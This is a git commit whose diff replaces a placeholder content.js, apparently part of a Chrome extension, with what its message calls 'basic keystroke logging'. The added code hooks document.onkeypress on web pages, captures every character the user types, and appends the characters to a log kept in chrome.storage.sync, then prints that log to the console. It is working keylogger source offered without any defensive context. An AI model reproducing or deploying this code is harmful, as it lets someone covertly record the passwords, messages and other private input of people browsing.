eb5231f0a46abf32acedb465c256141e884e3413
= <mpluders@gmail.com>
2015-12-31 14:18:17 -0800

    Basic keystroke logging

--- content.js
+++ content.js
@@ -1,2 +1,55 @@
-alert("hello");
-document.body.style.background = 'yellow';
+var stringToWrite = "";
+
+function writeStringToStorage(s) {
+	
+	chrome.storage.sync.get("logFile", function(items) {
+	    if (!chrome.runtime.error) {
+				var oldString;
+				
+				if (items.logFile)
+					oldString = items.logFile;
+				else
+					oldString = "";
+				
+				var newString = oldString + s;
+				chrome.storage.sync.set({"logFile": newString});
+	    }
+	  });
+	
+	/*var oldString;
+	
+	if (localStorage.logFile)
+		oldString = localStorage.logFile;
+	else
+		oldString = "";
+	
+	var newString = oldString + s;
+	
+	localStorage.logFile = newString;
+	alert (localStorage.logFile);*/
+		
+	chrome.storage.sync.get("logFile", function(items) {
+	    if (!chrome.runtime.error) {
+	      console.log(items.logFile);
+	    }
+	  });
+	
+}
+
+document.onkeypress = function(evt) {
+	
+	// Get the key
+	evt = evt || window.event;
+	var charCode = evt.keyCode || evt.which;
+	var charStr = String.fromCharCode(charCode);
+	
+	// Prepare to write
+	stringToWrite += charStr;
+	
+	// Write to chrome.storage
+	if (stringToWrite.length >= 3) {
+		writeStringToStorage(stringToWrite);
+		stringToWrite = "";
+	}
+	
+}
